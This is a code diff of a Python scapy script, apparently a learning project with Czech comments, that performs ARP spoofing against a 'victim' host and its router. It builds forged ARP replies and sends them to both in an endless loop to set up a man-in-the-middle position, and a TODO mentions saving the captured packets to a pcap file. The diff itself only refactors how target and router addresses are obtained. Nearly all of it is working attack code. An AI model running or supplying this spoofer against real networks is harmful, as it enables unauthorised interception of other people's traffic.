@@ -12,39 +12,19 @@
 
 # 4. TODO: Funkce save_capture(packet_list, filename="capture.pcap")
 #    - Použít wrpcap() k uložení nasbíraných dat.
-from scapy.all import ARP, wrpcap, sr1, send
+from scapy.all import ARP, wrpcap, send as s
 import time
-
+from network_utils import target_ip, target_mac, router_ip, router_mac
 
 # --- Config --- #
 
-
-# Získání ip adresy a mac adresy oběti a routeru
-ip_obet = input("Zadejte IP adresu oběti: ")
-ip_router = input("Zadejte IP adresu routeru: ")
-
-# Získání MAC adresy oběti a routeru pomocí ARP požadavků
-odpoved_obet = sr1(ARP(pdst=ip_obet), timeout=2, verbose=False)
-odpoved_router = sr1(ARP(pdst=ip_router), timeout=2, verbose=False)
-
-if odpoved_obet == None:
-    print(f"Nepodařilo se získat MAC adresu oběti ({ip_obet}).")
-    exit()
-
-if odpoved_router == None:
-    print(f"Nepodařilo se získat MAC adresu routeru ({ip_router}).")
-    exit()
-
-mac_obet = odpoved_obet[ARP].hwsrc
-mac_router = odpoved_router[ARP].hwsrc
-
 # Vytvoření falešného ARP paketu pro oběť
-arp_obet = ARP(op=2, psrc=ip_router, pdst=ip_obet, hwdst=mac_obet)
-arp_router = ARP(op=2, psrc=ip_obet, pdst=ip_router, hwdst=mac_router)
+arp_obet = ARP(op=2, psrc=router_ip, pdst=target_ip, hwdst=target_mac)
+arp_router = ARP(op=2, psrc=target_ip, pdst=router_ip, hwdst=router_mac)
 
 # Restore tabulek
-arp_obet_restore = ARP(op=2, psrc=ip_router, hwsrc=mac_router, pdst=ip_obet, hwdst=mac_obet)
-arp_router_restore = ARP(op=2, psrc=ip_obet, hwsrc=mac_obet, pdst=ip_router, hwdst=mac_router)
+arp_obet_restore = ARP(op=2, psrc=router_ip, hwsrc=router_mac, pdst=target_ip, hwdst=target_mac)
+arp_router_restore = ARP(op=2, psrc=target_ip, hwsrc=target_mac, pdst=router_ip, hwdst=router_mac)
 
 
 # --- Hlavní funkce --- #
@@ -53,15 +33,15 @@ def spoof():
     try: 
         print(f"Posílám falešné ARP pakety: Ctrl+C pro ukončení.")
         while True:
-            send(arp_obet, verbose=False)
-            send(arp_router, verbose=False)
+            s(arp_obet, verbose=False)
+            s(arp_router, verbose=False)
             time.sleep(2)
 
     except KeyboardInterrupt:
         print("Ukončuji útok, vracím síť do normálu...")
         # Odeslání správných ARP paketů pro obnovení sítě
-        send(arp_obet_restore, verbose=False, count=5)
-        send(arp_router_restore, verbose=False, count=5)
+        s(arp_obet_restore, verbose=False, count=5)
+        s(arp_router_restore, verbose=False, count=5)
 
         print("Síť byla obnovena. Program ukončen.")
 
